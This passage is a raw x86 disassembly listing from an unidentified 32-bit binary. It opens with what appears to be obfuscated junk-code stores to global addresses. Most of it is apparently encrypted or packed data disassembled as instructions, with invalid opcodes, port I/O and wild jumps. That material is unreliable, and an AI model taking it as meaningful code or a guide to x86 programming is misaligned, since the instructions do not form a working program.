  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1+0x5e6a3859],dl
  41419c:	cmp    edi,ecx
  41419e:	stos   BYTE PTR es:[edi],al
  41419f:	xchg   ebp,eax
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx-0x303c5b17],0x7a
  4141ac:	jae    0x41419c
  4141ae:	xchg   ebx,eax
  4141af:	sub    edx,0x1104a4a8
  4141b5:	mov    ebx,0x50d66671
  4141ba:	sub    dh,BYTE PTR ds:0x62c3a1
  4141c0:	add    DWORD PTR ds:0xa61984a7,edx
  4141c6:	xor    ah,BYTE PTR [esi-0x35]
  4141c9:	push   esi
  4141ca:	clc    
  4141cb:	cdq    
  4141cc:	cmp    eax,0x67a8502e
  4141d1:	mov    bh,0x88
  4141d3:	adc    DWORD PTR [ebx+0x426fe1bb],esi
  4141d9:	cld    
  4141da:	xchg   ebp,eax
  4141db:	in     eax,0x45
  4141dd:	xchg   edx,eax
  4141de:	mov    ebp,0x1b923ef1
  4141e3:	leave  
  4141e4:	push   eax
  4141e5:	dec    esp
  4141e6:	test   al,0xd0
  4141e8:	jmp    0x414206
  4141ea:	xchg   ebp,eax
  4141eb:	in     al,dx
  4141ec:	mov    bh,0xac
  4141ee:	(bad)  
  4141ef:	add    BYTE PTR ds:0xe7604dd6,ch
  4141f5:	addr16 or eax,0xddc50157
  4141fb:	ds push 0x6f3c9998
  414201:	hlt    
  414202:	fimul  DWORD PTR [eax+0x7b16e83d]
  414208:	fiadd  DWORD PTR [eax]
  41420a:	mov    dh,BYTE PTR [edx+0x3f]
  41420d:	mov    ebx,ecx
  41420f:	rcl    BYTE PTR [esi],1
  414211:	fnsave [esi-0x59]
  414214:	nop
  414215:	xor    ecx,eax
  414217:	xchg   ebx,eax
  414218:	add    eax,0x2c5e27e8
  41421d:	sub    BYTE PTR [eax+0x5f603fda],dh
  414223:	lahf   
  414224:	sbb    eax,0xffffff84
  414227:	imul   DWORD PTR [ebx+0x22]
  41422a:	and    dh,BYTE PTR [eax]
  41422c:	imul   ebp,DWORD PTR [eax-0xe21a31],0x48241bce
  414236:	xchg   edi,eax
  414237:	jle    0x414224
  414239:	push   fs
  41423b:	dec    esp
  41423c:	ds aaa 
  41423e:	mov    ecx,edx
  414240:	dec    eax
  414241:	loopne 0x414205
  414243:	pop    edx
  414244:	or     BYTE PTR [ecx-0xb0ba2dc],dl
  41424a:	scas   al,BYTE PTR es:[edi]
  41424b:	aaa    
  41424c:	ret    
  41424d:	jo     0x4142b5
  41424f:	adc    edi,DWORD PTR [ebp+0x15515b08]
  414255:	push   ds
  414256:	push   esi
  414257:	pushf  
  414258:	jno    0x4141e3
  41425a:	xor    BYTE PTR [ebx-0x111a1192],dl
  414260:	push   ebp
  414261:	aaa    
  414262:	std    
  414263:	xchg   ebp,eax
  414264:	and    dl,BYTE PTR [eax+0x378c5464]
  41426a:	cmp    BYTE PTR [eax+0x33bab842],al
  414270:	sbb    eax,0x69a5fa4d
  414275:	sub    eax,0x7202aae2
  41427a:	(bad)  
  41427c:	adc    al,0x3a
  41427e:	pop    ds
  41427f:	sub    bl,BYTE PTR [ebx+ecx*1]
  414282:	cmp    esp,edi
  414284:	fnstcw WORD PTR [ecx-0x7a3ceb76]
  41428a:	cs popa 
  41428c:	mov    bl,0xd1
  41428e:	retf   
  41428f:	cmp    BYTE PTR [eax],ah
  414291:	xchg   ecx,eax
  414292:	adc    al,0x18
  414294:	das    
  414295:	cs mov ebp,0xa12da3d5
  41429b:	pop    ebx
  41429c:	shl    BYTE PTR [esi-0x6b7ffed1],1
  4142a2:	sub    cl,ah
  4142a4:	pop    ecx
  4142a5:	add    eax,0xe2cc2906
  4142aa:	push   eax
  4142ab:	sbb    DWORD PTR [edi],edi
  4142ad:	inc    eax
  4142ae:	xchg   edx,eax
  4142af:	loop   0x4142cf
  4142b1:	push   ss
  4142b2:	fld    TBYTE PTR [esi-0x32988d08]
  4142b8:	jb     0x41430f
  4142ba:	pop    esp
  4142bb:	mov    ebx,DWORD PTR [edi+0x350d1f9e]
  4142c1:	push   ss
  4142c2:	shl    ecx,0xd7
  4142c5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4142c7:	add    DWORD PTR [ebx-0x44ab65ea],esp
  4142cd:	mov    ss,eax
  4142cf:	in     eax,dx
  4142d0:	(bad)  
  4142d1:	repz xchg esi,eax
  4142d3:	lods   eax,DWORD PTR ds:[esi]
  4142d4:	mov    eax,ds:0x2f20e20f
  4142d9:	mov    ds:0xcf8a368e,eax
  4142de:	cwde   
  4142df:	or     DWORD PTR [ebx-0x44],ebx
  4142e2:	jae    0x414276
  4142e4:	div    esi
  4142e6:	push   ebp
  4142e7:	sub    DWORD PTR [edx+0x6f],0x3e
  4142eb:	sar    ah,1
  4142ed:	push   ss
  4142ee:	xchg   esp,eax
  4142ef:	loop   0x41428d
  4142f1:	sar    BYTE PTR [ecx+ebx*4],0xa1
  4142f5:	scas   al,BYTE PTR es:[edi]
  4142f6:	das    
  4142f7:	xor    esi,edx
  4142f9:	dec    ebp
  4142fa:	mov    es,WORD PTR [edi+ebp*1]
  4142fd:	(bad)  
  4142ff:	and    DWORD PTR [ecx],ecx
  414301:	pushf  
  414302:	test   al,ah
  414304:	dec    esi
  414305:	dec    ebp
  414306:	xor    DWORD PTR [ebx-0x55],0xf00b4477
  41430d:	idiv   BYTE PTR [edx+0xf]
  414310:	nop
  414311:	lahf   
  414312:	mov    edx,0xa3b5bdbd
  414317:	fwait
  414318:	jmp    0x4142ee
  41431a:	pop    edx
  41431b:	mov    edi,0x6fde5c79
  414320:	scas   eax,DWORD PTR es:[edi]
  414321:	jnp    0x4142f4
  414323:	test   edi,eax
  414325:	int3   
  414326:	jno    0x4142b9
  414328:	jl     0x41435d
  41432a:	dec    ebx
  41432b:	sbb    BYTE PTR [ebp-0x2010039b],0x17
  414332:	xchg   esp,eax
  414333:	js     0x414335
  414335:	pusha  
  414336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414337:	fadd   st(2),st
  414339:	cmp    eax,0x2c57ff4
  41433e:	cmp    dh,BYTE PTR ds:0xb1498528
  414344:	add    al,0x73
  414346:	cdq    
  414347:	ins    BYTE PTR es:[edi],dx
  414348:	sbb    BYTE PTR [ebx+0x34e49c10],al
  41434e:	fwait
  41434f:	and    BYTE PTR [ecx],0xe3
  414352:	nop
  414353:	sub    eax,DWORD PTR [ebp-0x56a39b2c]
  414359:	dec    edi
  41435a:	fist   DWORD PTR [ebx]
  41435c:	mov    dl,0x46
  41435e:	pop    es
  41435f:	jbe    0x4142f9
  414361:	jb     0x414300
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	inc    esp
  414365:	xchg   edi,eax
  414366:	sbb    al,0x72
  414368:	dec    ebx
  414369:	(bad)  
  41436a:	pop    ds
  41436b:	push   es
  41436c:	call   0x7df2da69
  414371:	mov    edx,ds
  414373:	inc    esi
  414374:	fdivr  DWORD PTR [edx-0x7c]
  414377:	cmp    ah,BYTE PTR [edx]
  414379:	mov    WORD PTR [ecx-0x190e5302],?
  41437f:	jae    0x414350
  414381:	sbb    BYTE PTR [edx+0x8],0x88
  414385:	arpl   dx,bp
  414387:	jmp    0xa8f0f609
  41438c:	push   edi
  41438d:	push   edi
  41438e:	in     al,dx
  41438f:	push   cs
  414390:	push   cs
  414391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414392:	adc    dl,BYTE PTR [eax]
  414394:	(bad)  
  414395:	rol    cl,1
  414397:	sahf   
  414398:	out    dx,al
  414399:	add    esp,ecx
  41439b:	mov    ah,0x9f
  41439d:	mov    esi,0x18451af7
  4143a2:	in     al,dx
  4143a3:	mov    eax,ds:0x148a3568
  4143a8:	inc    esi
  4143a9:	mov    edx,0x62da3238
  4143ae:	loopne 0x414388
  4143b0:	or     cl,ch
  4143b2:	sub    eax,0xf7941b7a
  4143b7:	mov    ah,0xb0
  4143b9:	mov    dh,0xf4
  4143bb:	xchg   ecx,eax
  4143bc:	push   esp
  4143bd:	add    eax,0x922a3ada
  4143c2:	pusha  
  4143c3:	pusha  
  4143c4:	xlat   BYTE PTR ds:[ebx]
  4143c5:	push   edx
  4143c6:	jno    0x414349
  4143c8:	jno    0x414352
  4143ca:	adc    BYTE PTR [eax+0x62],dh
  4143cd:	imul   cl
  4143cf:	arpl   si,si
  4143d1:	xchg   edi,eax
  4143d2:	mov    dh,0xf
  4143d4:	(bad)  
  4143d5:	mov    ds:0x7459d422,al
  4143da:	pop    es
  4143db:	out    dx,al
  4143dc:	call   esp
  4143de:	addr16 xchg esp,eax
  4143e0:	pop    eax
  4143e1:	push   edi
  4143e2:	into   
  4143e3:	scas   al,BYTE PTR es:[edi]
  4143e4:	fs xchg ebx,eax
  4143e6:	sahf   
  4143e7:	sbb    DWORD PTR [ebx],0x2a
  4143ea:	inc    edx
  4143eb:	jecxz  0x4143f8
  4143ed:	xchg   ebp,eax
  4143ee:	xor    BYTE PTR [edi-0x5b],dl
  4143f1:	pop    ebx
  4143f2:	hlt    
  4143f3:	repz cwde 
  4143f5:	mov    ds:0xda93e8ee,eax
  4143fa:	jge    0x414417
  4143fc:	mov    ch,0xb9
  4143fe:	adc    al,0x67
  414400:	sbb    BYTE PTR [edi+0x1a73beb0],dl
  414406:	add    cl,BYTE PTR [esi]
  414408:	sbb    cl,BYTE PTR [edi-0x2667b830]
  41440e:	xor    eax,0xce50b411
  414413:	cwde   
  414414:	push   eax
  414415:	outs   dx,BYTE PTR ds:[esi]
  414416:	xchg   ebp,eax
  414417:	stos   DWORD PTR es:[edi],eax
  414418:	mov    bl,0xa8
  41441a:	scas   al,BYTE PTR es:[edi]
  41441b:	cmp    al,0x96
  41441d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41441e:	rol    dl,0x11
  414421:	ja     0x4143db
  414423:	call   0xac0d:0xcdf47344
  41442a:	and    ebx,0xffffffa2
  41442d:	lock mov dh,0x10
  414430:	test   DWORD PTR cs:[esi-0x5],eax
  414434:	sub    BYTE PTR [edi],0x38
  414437:	arpl   WORD PTR [esi-0x409d11ca],si
  41443d:	mov    cl,0x20
  41443f:	lods   al,BYTE PTR ds:[esi]
  414440:	mov    eax,ds:0xe0adc1a0
  414445:	int3   
  414446:	fsub   DWORD PTR [eax]
  414448:	fld    TBYTE PTR [edx]
  41444a:	dec    esp
  41444b:	push   ebp
  41444c:	or     BYTE PTR [edi+0x6c],bl
  41444f:	jge    0x4143dc
  414451:	adc    DWORD PTR [edi+0x80f2d0a],ecx
  414457:	jecxz  0x4144b2
  414459:	or     esi,0xd9a1ffae
  41445f:	repz daa 
  414461:	add    bl,al
  414463:	in     eax,0x6f
  414465:	jp     0x41448d
  414467:	add    ecx,DWORD PTR [edi+0x68143273]
  41446d:	xor    BYTE PTR ds:0x67ebd28e,0x49
  414474:	out    0xb6,al
  414476:	inc    ebx
  414477:	push   edi
  414478:	sar    BYTE PTR [ebx-0x9],cl
  41447b:	cmp    edi,eax
  41447d:	mov    ebx,0x688ff181
  414482:	sbb    edi,ebp
  414484:	xchg   ecx,eax
  414485:	push   0x7e
  414487:	xchg   ebx,eax
  414488:	std    
  414489:	je     0x41449e
  41448b:	inc    ecx
  41448c:	push   ss
  41448d:	scas   eax,DWORD PTR es:[edi]
  41448e:	push   ecx
  41448f:	xchg   esp,eax
  414490:	aas    
  414491:	dec    edx
  414492:	lahf   
  414493:	or     eax,0x3737e0f8
  414498:	mov    ecx,0x3012fb50
  41449d:	mov    eax,ds:0x6766f15d
  4144a2:	sub    eax,0x7bf644b5
  4144a7:	and    eax,0x5e1d4300
  4144ac:	cmp    edx,esi
  4144ae:	fucomip st,st(5)
  4144b0:	pusha  
  4144b1:	or     al,BYTE PTR [ebx]
  4144b3:	inc    ecx
  4144b4:	sbb    esi,eax
  4144b6:	inc    edi
  4144b7:	int3   
  4144b8:	push   0x7a
  4144ba:	mov    WORD PTR [eax-0x47],es
  4144bd:	leave  
  4144be:	lock call DWORD PTR [esi-0x1aed9755]
  4144c5:	add    ch,BYTE PTR [edx+0x4935cc37]
  4144cb:	in     eax,dx
  4144cc:	out    0xd,eax
  4144ce:	test   DWORD PTR [ebx-0x2c],edi
  4144d1:	mov    esi,DWORD PTR [esi]
  4144d3:	dec    ebp
  4144d4:	inc    ebp
  4144d5:	das    
  4144d6:	or     ebx,esp
  4144d8:	adc    al,0x64
  4144da:	cld    
  4144db:	cs cmp eax,0xd57aa50d
  4144e1:	fbld   TBYTE PTR [esi-0x9]
  4144e4:	push   cs
  4144e5:	mov    ?,eax
  4144e7:	pinsrw mm2,WORD PTR [ecx],0x91
  4144eb:	ret    0x1b6
  4144ee:	cmp    DWORD PTR [ebx-0x7f],esi
  4144f1:	jmp    0xebfdea53
  4144f6:	repz add DWORD PTR [esi],esi
  4144f9:	(bad)  
  4144fa:	fild   WORD PTR [ecx+0x3eb2e409]
  414500:	lods   eax,DWORD PTR ds:[esi]
  414501:	jne    0x4144a4
  414503:	adc    cl,bh
  414505:	cmp    eax,0xd417b6c
  41450a:	pop    ebp
  41450b:	shl    DWORD PTR [edi-0x62],0x80
  41450f:	mov    esp,0x3725f721
  414514:	xor    dh,al
  414516:	pop    ebp
  414517:	bound  ebx,QWORD PTR [edi+ebp*4+0x720c208e]
  41451e:	call   0xf06c:0xa13fe1e7
  414525:	fs popa 
  414527:	sti    
  414528:	xchg   ebx,eax
  414529:	jmp    0xc43382a5
  41452e:	aam    0x8f
  414530:	or     al,0x31
  414532:	and    ecx,ebp
  414534:	push   esi
  414535:	cdq    
  414536:	mov    dh,0xf8
  414538:	mov    edx,0x1c2982
  41453d:	js     0x4145ab
  41453f:	int    0x67
  414541:	add    al,0x9c
  414543:	call   0xb1e5661a
  414548:	(bad)  
  414549:	jno    0x4145b2
  41454b:	sbb    edi,esp
  41454d:	(bad)  
  41454e:	mov    ds:0x714ff630,al
  414553:	xchg   ecx,eax
  414554:	dec    edx
  414555:	mov    ds:0x2e9fb13a,eax
  41455a:	and    BYTE PTR [edx],ah
  41455c:	jae    0x4145a3
  41455e:	stos   DWORD PTR es:[edi],eax
  41455f:	dec    edx
  414560:	shl    BYTE PTR [edi],1
  414562:	repz mov al,ds:0xc0d75ed6
  414568:	out    0x98,eax
  41456a:	inc    edx
  41456b:	push   cs
  41456c:	imul   eax,DWORD PTR [ebp+edi*1-0x1c],0xffffffac
  414571:	and    BYTE PTR [ebx],bh
  414573:	(bad)
  414578:	xchg   ebp,eax
  414579:	test   al,0x3f
  41457b:	add    eax,DWORD PTR [ebx]
  41457d:	sub    esi,DWORD PTR [ebx]
  41457f:	mov    ebx,0x739e756f
  414584:	pop    ds
  414585:	int3   
  414586:	jo     0x41457e
  414588:	call   FWORD PTR [eax]
  41458a:	(bad)  
  41458b:	jno    0x414557
  41458d:	or     al,0xd8
  41458f:	push   ss
  414590:	ss aam 0xf8
  414593:	pop    edx
  414594:	ds push esi
  414596:	dec    ecx
  414597:	jne    0x41452f
  414599:	nop
  41459a:	lock daa 
  41459c:	mov    al,0x3f
  41459e:	out    dx,eax
  41459f:	retf   
  4145a0:	icebp  
  4145a1:	aam    0x51
  4145a3:	jle    0x4145a3
  4145a5:	shl    DWORD PTR [ebx+esi*8+0x67a666bc],0x84
  4145ad:	int    0x37
  4145af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b0:	lods   eax,DWORD PTR ss:[esi]
  4145b2:	ror    DWORD PTR [edx],0xe9
  4145b5:	neg    DWORD PTR [esi]
  4145b7:	sahf   
  4145b8:	push   0x8b337bd6
  4145bd:	stc    
  4145be:	mov    DWORD PTR [ebx],ecx
  4145c0:	test   al,0x97
  4145c2:	and    al,0x5
  4145c4:	lods   al,BYTE PTR ds:[esi]
  4145c5:	push   ss
  4145c6:	ds lea ecx,gs:[esi-0xc]
  4145cb:	test   ebp,ecx
  4145cd:	das    
  4145ce:	imul   esi,DWORD PTR [edi-0x5d81593b],0x7e
  4145d5:	cdq    
  4145d6:	loope  0x4145bb
  4145d8:	test   al,0x33
  4145da:	fstp   TBYTE PTR [esi-0x6e5935fa]
  4145e0:	sub    dl,BYTE PTR [esi]
  4145e2:	add    BYTE PTR [esi],ah
  4145e4:	xchg   ecx,eax
  4145e5:	pop    ebx
  4145e6:	pop    eax
  4145e7:	mov    al,BYTE PTR ds:0x2d07fc9
  4145ed:	rcl    BYTE PTR [ebx-0x69],cl
  4145f0:	cmp    dl,al
  4145f2:	out    dx,eax
  4145f3:	mov    ch,0x7d
  4145f5:	shl    al,cl
  4145f7:	daa    
  4145f8:	ret    0x7310
  4145fb:	ficomp DWORD PTR [esi+0x1bab2afc]
  414601:	sbb    DWORD PTR [ecx],ebx
  414603:	out    dx,al
  414604:	or     edx,DWORD PTR [ebp-0x7]
  414607:	push   cs
  414608:	inc    edi
  414609:	inc    esp
  41460a:	mov    edx,0xa6bb1298
  41460f:	fwait
  414610:	push   esi
  414611:	rol    BYTE PTR [ecx+0x5c],cl
  414614:	sbb    eax,0x8318060c
  414619:	cmp    bl,BYTE PTR [edi+0x35]
  41461c:	aam    0xe7
  41461e:	cs cs mov dh,0xde
  414622:	inc    esi
  414623:	ror    DWORD PTR [edi-0x4b],0x1f
  414627:	fbld   TBYTE PTR [esi+0x24a10f53]
  41462d:	push   ebx
  41462e:	inc    ebx
  41462f:	rcr    DWORD PTR [edx-0x29],0xb9
  414633:	sbb    DWORD PTR [ebp-0x32bb9313],edi
  414639:	ror    DWORD PTR [edx-0x34],cl
  41463c:	sti    
  41463d:	add    BYTE PTR ds:0x8a7b0b69,dl
  414643:	jnp    0x414660
  414645:	stc    
  414646:	push   esi
  414647:	dec    DWORD PTR [ebx+esi*8-0x39558dae]
  41464e:	lods   al,BYTE PTR ds:[esi]
  41464f:	stc    
  414650:	pusha  
  414651:	pop    esp
  414652:	pop    DWORD PTR [ecx+0x4771083]
  414658:	rol    BYTE PTR [edi],0xd5
  41465b:	xor    DWORD PTR [edi],ebp
  41465d:	xchg   esi,eax
  41465e:	jns    0x41464b
  414660:	daa    
  414661:	mov    WORD PTR [esi+0xe6412c7],?
  414667:	jmp    0x4146b5
  414669:	push   esp
  41466a:	inc    edx
  41466b:	popa   
  41466c:	stos   BYTE PTR es:[edi],al
  41466d:	shl    BYTE PTR ds:0x60b10c66,cl
  414673:	push   esp
  414674:	mov    eax,?
  414676:	shl    DWORD PTR [eax],1
  414678:	aad    0xa
  41467a:	outs   dx,BYTE PTR ds:[esi]
  41467b:	scas   al,BYTE PTR es:[edi]
  41467c:	cmp    ebp,ebp
  41467e:	xchg   ebp,eax
  41467f:	and    eax,0xf6d4a53a
  414684:	mov    DWORD PTR [edx],edx
  414686:	retf   
  414687:	inc    ebx
  414688:	or     bh,BYTE PTR [ebp+0x27]
  41468b:	dec    eax
  41468c:	mov    ah,0xb4
  41468e:	in     al,dx
  41468f:	test   DWORD PTR [eax],ecx
  414691:	jl     0x414657
  414693:	dec    ecx
  414694:	mov    bh,0x88
  414696:	pop    eax
  414697:	sbb    DWORD PTR [edi-0x78],eax
  41469a:	mov    esp,0x1e78e28f
  41469f:	or     bh,BYTE PTR ds:0xb1148fd8
  4146a5:	loopne 0x414722
  4146a7:	ret    
  4146a8:	retf   
  4146a9:	jae    0x4146c3
  4146ab:	dec    edx
  4146ac:	push   esp
  4146ad:	cmp    ebp,DWORD PTR [ebx+eax*8]
  4146b0:	push   edi
  4146b1:	loopne 0x414678
  4146b3:	scas   al,BYTE PTR es:[edi]
  4146b4:	clc    
  4146b5:	out    0xdf,eax
  4146b7:	ds dec esp
  4146b9:	iret   
  4146ba:	popf   
  4146bb:	sub    al,0x7
  4146bd:	ds adc al,0xe8
  4146c0:	(bad)  
  4146c1:	(bad)  
  4146c2:	fdivp  st(3),st
  4146c4:	inc    esp
  4146c5:	push   esi
  4146c6:	(bad)  
  4146c7:	test   eax,0xd039164b
  4146cc:	cdq    
  4146cd:	mov    edi,0xb0283608
  4146d2:	scas   al,BYTE PTR es:[edi]
  4146d3:	loope  0x414704
  4146d5:	sbb    BYTE PTR [eax],dl
  4146d7:	shr    DWORD PTR [ecx],1
  4146d9:	ret    
  4146da:	les    esi,FWORD PTR [edx+0x75]
  4146dd:	and    al,0xd5
  4146df:	in     al,0xd
  4146e1:	push   ebp
  4146e2:	scas   eax,DWORD PTR es:[edi]
  4146e3:	loop   0x414728
  4146e5:	jecxz  0x414699
  4146e7:	(bad)  
  4146e8:	and    BYTE PTR [edx],dl
  4146ea:	ins    DWORD PTR es:[edi],dx
  4146eb:	pop    ebp
  4146ec:	xchg   edi,eax
  4146ed:	cmp    DWORD PTR [esi+eax*2],edi
  4146f0:	sbb    eax,0xae547557
  4146f6:	(bad)  
  4146f7:	jne    0x414747
  4146f9:	das    
  4146fa:	pushf  
  4146fb:	mov    edi,DWORD PTR fs:[eax+0x6d]
  4146ff:	dec    ebp
  414700:	(bad)  
  414701:	mov    bh,0xb7
  414703:	jg     0x41473d
  414705:	add    ebx,DWORD PTR [esi-0x4f53913d]
  41470b:	jmp    0xe917:0x17aa5af7
  414712:	push   edx
  414713:	(bad)  
  414714:	repz cld 
  414716:	mov    ch,0xfa
  414718:	and    DWORD PTR [ebx-0x3b],ebp
  41471b:	push   ds
  41471c:	pop    eax
  41471d:	mov    edx,0xd919f56d
  414722:	cmp    BYTE PTR [edx-0x61d46565],ah
  414728:	lods   eax,DWORD PTR ds:[esi]
  414729:	(bad)  
  41472a:	repnz sbb cl,BYTE PTR [esp+ecx*4]
  41472e:	cmp    BYTE PTR [edx+0x258956f7],0x1b
  414735:	rcr    BYTE PTR [eax+eax*2+0x6c87e051],cl
  41473c:	rcl    BYTE PTR [esi+0x17],0xf6
  414740:	test   BYTE PTR [edi+edi*8-0x1e],bl
  414744:	push   esp
  414745:	xchg   al,cl
  414747:	mov    cl,0xe1
  414749:	add    eax,0xde39f853
  41474e:	outs   dx,DWORD PTR ds:[esi]
  41474f:	test   DWORD PTR [esi-0x59819e75],edi
  414755:	or     al,0xb7
  414757:	mov    esp,0x81cf0e15
  41475c:	sbb    ah,bh
  41475e:	mov    eax,ds:0x3dfd8305
  414763:	sbb    bh,BYTE PTR [ebp-0x2fdc8571]
  414769:	sub    al,0xaf
  41476b:	(bad)  
  41476c:	sti    
  41476d:	repnz addr16 or dh,dl
  414771:	or     DWORD PTR [ebx],0x70
  414774:	fs xchg esi,eax
  414776:	push   es
  414777:	jle    0x4147b5
  414779:	inc    esp
  41477a:	outs   dx,DWORD PTR ds:[esi]
  41477b:	in     eax,dx
  41477c:	retf   0xe68f
  41477f:	not    edx
  414781:	add    esp,DWORD PTR ds:[ebp+0x5e]
  414785:	dec    edx
  414786:	(bad)  [ebx]
  414788:	aad    0x1
  41478a:	addr16 nop
  41478c:	aas    
  41478d:	push   ecx
  41478e:	retf   0x4890
  414791:	pop    esi
  414792:	mov    ds,WORD PTR [eax-0x56f84118]
  414798:	(bad)  
  414799:	popa   
  41479a:	psadbw mm1,QWORD PTR [ebx-0x40]
  41479e:	jle    0x41474b
  4147a0:	ror    DWORD PTR ds:0x54efa7c3,0x8d
  4147a7:	pop    es
  4147a8:	fisub  WORD PTR [eax+0x3dcc21f0]
  4147ae:	imul   esp,esp,0xffffff84
  4147b1:	sbb    cl,BYTE PTR [esi+0x37]
  4147b4:	mov    edx,0xf706c5c1
  4147b9:	lea    ebx,[ebp+0x39]
  4147bc:	or     esi,DWORD PTR [eax+ecx*1-0x7f55b85d]
  4147c3:	test   BYTE PTR [ebx],0x42
  4147c6:	(bad)  
  4147c7:	xlat   BYTE PTR ds:[ebx]
  4147c8:	mov    ah,0x92
  4147ca:	jmp    0x328:0xa10cceca
  4147d1:	pop    ecx
  4147d2:	mov    edx,0x554f0ef0
  4147d7:	mov    ch,0x39
  4147d9:	outs   dx,BYTE PTR ds:[esi]
  4147da:	mov    ch,dl
  4147dc:	mov    al,0xe8
  4147de:	or     al,0x52
  4147e0:	inc    edi
  4147e1:	xor    ah,ah
  4147e3:	enter  0x7c3f,0xd8
  4147e7:	sbb    dl,cl
  4147e9:	pop    es
  4147ea:	sbb    cl,ah
  4147ec:	test   ebx,esi
  4147ee:	push   esi
  4147ef:	jmp    0x229:0xc3ae9
  4147f6:	hlt    
  4147f7:	inc    eax
  4147f8:	(bad)  
  4147f9:	xlat   BYTE PTR ds:[ebx]
  4147fa:	mov    edi,0x811cbbda
  4147ff:	and    esi,DWORD PTR [edi]
  414801:	inc    edx
  414802:	dec    edi
  414803:	sbb    cl,BYTE PTR [ecx-0x43a93a10]
  414809:	loop   0x414880
  41480b:	test   al,0xc2
  41480d:	jmp    0x1333:0x934075fc
  414814:	or     BYTE PTR [esi],bl
  414816:	xor    dh,BYTE PTR [edx-0x2fbc7c0a]
  41481c:	repnz mov edi,0xc2d6f3dd
  414822:	popa   
  414823:	pop    es
  414824:	xor    DWORD PTR [edx],0x8b530452
  41482a:	rcr    ebp,0x27
  41482d:	inc    ebp
  41482e:	add    bl,BYTE PTR [ecx-0x62140d35]
  414834:	push   edi
  414835:	cmc    
  414836:	fs jnp 0x4147ca
  414839:	add    DWORD PTR [ebx+0xf],eax
  41483c:	jns    0x41482e
  41483e:	xlat   BYTE PTR ds:[ebx]
  41483f:	inc    ecx
  414840:	cmp    DWORD PTR [ebp+0x67],esi
  414843:	fadd   DWORD PTR [edi]
  414845:	fistp  WORD PTR [ebx-0x39]
  414848:	lods   al,BYTE PTR ds:[esi]
  414849:	(bad)  
  41484a:	add    al,0xb2
  41484c:	add    al,0x97
  41484e:	(bad)  
  41484f:	cmc    
  414850:	shl    WORD PTR [ebx-0x26],1
  414854:	xor    esp,DWORD PTR [edi+0x3d]
  414857:	adc    al,0x63
  414859:	jl     0x414855
  41485b:	mov    ebp,0x219e8b5a
  414860:	xor    DWORD PTR ds:0xa2b3ec26,0xca2317a3
  41486a:	loop   0x414806
  41486c:	bound  esp,QWORD PTR [esi-0x4575df96]
  414872:	dec    edi
  414873:	daa    
  414874:	stos   BYTE PTR es:[edi],al
  414875:	adc    edx,ecx
  414877:	pop    edi
  414878:	xchg   edi,eax
  414879:	mov    ah,0xa9
  41487b:	out    dx,al
  41487c:	popf   
  41487d:	aaa    
  41487e:	ror    DWORD PTR ds:0xa453b90,0xda
  414885:	aaa    
  414886:	mov    ch,BYTE PTR [ebx]
  414888:	cld    
  414889:	rcl    BYTE PTR [eax+0x27664e55],1
  41488f:	push   ss
  414890:	repz pop ebx
  414892:	or     al,0x54
  414894:	jbe    0x4148be
  414896:	loop   0x41488b
  414898:	test   al,0x5d
  41489a:	out    dx,eax
  41489b:	cmp    BYTE PTR [ecx+eiz*2+0x78],al
  41489f:	dec    ecx
  4148a0:	nop
  4148a1:	imul   ebx,DWORD PTR [ecx+0x589f3894],0x111eede4
  4148ab:	dec    eax
  4148ac:	jl     0x4148ff
  4148ae:	inc    edx
  4148af:	xor    BYTE PTR [ebx-0x4a7d18e2],al
  4148b5:	mov    esi,0x77f97f76
  4148ba:	mov    ah,0xc4
  4148bc:	or     eax,0x84085cd3
  4148c1:	aam    0xa7
  4148c3:	jne    0x414914
  4148c5:	sbb    al,0x4b
  4148c7:	xchg   BYTE PTR [bx+di-0x5d70],dh
  4148cc:	inc    esi
  4148cd:	pop    esp
  4148ce:	inc    ebx
  4148cf:	dec    ebx
  4148d0:	xchg   BYTE PTR [ebx+0xc],dh
  4148d3:	lea    ecx,[ebp-0x57]
  4148d6:	shr    edx,cl
  4148d8:	mov    eax,0xf92c836a
  4148dd:	xchg   ebx,eax
  4148de:	stc    
  4148df:	ss repz pop edi
  4148e2:	dec    ecx
  4148e3:	add    BYTE PTR [ebx],al
  4148e5:	add    BYTE PTR [esi],bh
  4148e7:	mov    al,ds:0x6dec0311
  4148ec:	cld    
  4148ed:	pushf  
  4148ee:	cmp    al,0xe2
  4148f0:	xchg   ebp,eax
  4148f1:	(bad)  
  4148f2:	cdq    
  4148f3:	cli    
  4148f4:	sbb    dh,ah
  4148f6:	shl    ah,1
  4148f8:	mov    BYTE PTR fs:0x77dd374c,0x84
  414900:	cmp    eax,0x9826d819
  414905:	std    
  414906:	adc    DWORD PTR [esp+ecx*2+0x20ec9394],esi
  41490d:	pop    eax
  41490e:	jbe    0x4148be
  414910:	jns    0x414894
  414912:	cmp    BYTE PTR [ecx+ebp*8-0x3ecaa58a],0x3d
  41491a:	pop    ss
  41491b:	loop   0x41491c
  41491d:	push   eax
  41491e:	fnstsw WORD PTR [edi]
